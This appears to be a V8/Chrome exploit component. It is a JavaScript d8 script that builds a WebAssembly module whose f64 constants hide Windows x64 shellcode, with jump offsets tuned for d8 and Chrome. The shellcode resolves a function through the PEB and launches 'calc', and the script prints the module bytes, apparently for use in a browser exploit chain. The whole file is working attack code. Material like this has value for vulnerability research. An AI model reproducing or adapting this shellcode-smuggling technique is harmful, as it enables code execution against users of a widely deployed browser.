d8.file.execute("C:\\dev\\wasm-module-builder.js");

const importObject = {
  imports: { imported_func : Math.sin},
};


var builder = new WasmModuleBuilder();
let array = builder.addArray(kWasmF64, true);

var sig_index = builder.addType(kSig_d_d);

builder.addImport("imports", "imported_func", sig_index);
builder.addFunction("main", sig_index)
       .addBody([kExprLocalGet, 0, kExprCallFunction, 0])
       .exportAs("main");
//jumps: 0x45, 0x48 for d8
//0x1d, 0x20 for chrome
builder.addFunction("make_array", makeSig([], [wasmRefNullType(array)]))
         .addLocals(wasmRefNullType(array), 1)
         //shellcode start
         .addBody([kExprI32Const, 18, kGCPrefix, kExprArrayNewDefault, array, kExprLocalSet, 0,
                   kExprLocalGet, 0,
                   kExprI32Const, 0,
                   kExprF64Const, 0x90, 0x49, 0x83, 0xc4, 0x60, 0x90, 0xeb, 0x1d, //  49 83 c4 60 add r12,0x60  // change the first nop to int3 in order to debug
                   kGCPrefix, kExprArraySet, array,
                   kExprLocalGet, 0,
                   kExprI32Const, 1,
                   kExprF64Const, 0x65, 0x4d, 0x8b, 0x04, 0x24, 0x90, 0xeb, 0x20, //  65 4d 8b 04 24 mov r8,QWORD PTR gs:[r12]
                   kGCPrefix, kExprArraySet, array,
                   kExprLocalGet, 0,
                   kExprI32Const, 2,
                   kExprF64Const, 0x49, 0x8b, 0x78, 0x18, 0x90, 0x90, 0xeb, 0x20, // 49 8b 78 18  mov rdi,QWORD PTR [r8+0x18]
                   kGCPrefix, kExprArraySet, array,
                   kExprLocalGet, 0,
                   kExprI32Const, 3,
                   kExprF64Const, 0x48, 0x8b, 0x7f, 0x30, 0x90, 0x90, 0xeb, 0x20, // 48 8b 7f 30  mov rdi,QWORD PTR [rdi+0x30]
                   kGCPrefix, kExprArraySet, array,
                   kExprLocalGet, 0,
                   kExprI32Const, 4,
                   kExprF64Const, 0x48, 0x8b, 0x3f, 0x48, 0x8b, 0x3f, 0xeb, 0x20, // 48 8b 3f mov rdi,qword ptr [rdi]; mov rdi,qword ptr [rdi];
                   kGCPrefix, kExprArraySet, array,
                   kExprLocalGet, 0,
                   kExprI32Const, 5,
                   kExprF64Const, 0x48, 0x8b, 0x47, 0x10, 0x90, 0x90, 0xeb, 0x20, // 48 8b 47 10 mov rax,QWORD PTR [rdi+0x10]
                   kGCPrefix, kExprArraySet, array,
                   kExprLocalGet, 0,
                   kExprI32Const, 6,
                   kExprF64Const, 0x48, 0x05, 0x00, 0x86, 0x06, 0x00, 0xeb, 0x20, // 48 05 00 86 06 00 add rax,0x68600
                   kGCPrefix, kExprArraySet, array, 
                   kExprLocalGet, 0,
                   kExprI32Const, 7,
                   kExprF64Const, 0x48, 0x31, 0xc9, 0x51, 0x90, 0x90, 0xeb, 0x20, // 0:  48 31 c9   51  xor    rcx,rcx; push   rcx
                   kGCPrefix, kExprArraySet, array,
                   kExprLocalGet, 0,
                   kExprI32Const, 8,
                   kExprF64Const, 0x68, 0x63, 0x61, 0x6c, 0x63, 0x90, 0xeb, 0x20, //  68 63 6c 61 63  push   0x63616c63 pop rcx
                   kGCPrefix, kExprArraySet, array,
                   kExprLocalGet, 0,
                   kExprI32Const, 9,
                   kExprF64Const, 0x48, 0x31, 0xd2, 0x48, 0xff, 0xc2, 0xeb, 0x20,  // 48 31 d2   xor  rdx,rdx 3:  48 ff c2 incrdx
                   kGCPrefix, kExprArraySet, array,
                   kExprLocalGet, 0,
                   kExprI32Const, 10,
                   kExprF64Const, 0x48, 0x89, 0xe1, 0x90, 0x90, 0x90, 0xeb, 0x20, //48 89 e1 mov    rcx,rsp
                   kGCPrefix, kExprArraySet, array,
                   kExprLocalGet, 0,
                   kExprI32Const, 11,
                   kExprF64Const, 0x48, 0x83, 0xec, 0x28, 0x90, 0x90, 0xeb, 0x20, // 0x48, 0x83, 0xec, 0x20, 0x51 sub rsp,0x28
                   kGCPrefix, kExprArraySet, array,
                   kExprLocalGet, 0,
                   kExprI32Const, 12,
                   kExprF64Const, 0xff, 0xd0, 0x90, 0x90, 0x90, 0x90, 0xeb, 0x20, // ff d0, call rax
                   kGCPrefix, kExprArraySet, array,
                   kExprLocalGet, 0,
                   kExprI32Const, 13,
                   kExprF64Const, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0xeb, 0x20, // ff d0, call rax
                   kGCPrefix, kExprArraySet, array,
                   kExprLocalGet, 0,
                   kExprI32Const, 14,
                   kExprF64Const, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0xeb, 0x20, // ff d0, call rax
                   kGCPrefix, kExprArraySet, array,
                   kExprLocalGet, 0])
         .exportFunc();

var wasmBuffer = builder.toBuffer(false);
var bufStr = '['
for (let i = 0; i < wasmBuffer.length - 1; i++) {
  bufStr += wasmBuffer[i] + ',';
}
bufStr += wasmBuffer[wasmBuffer.length - 1] + ']';
console.log(bufStr);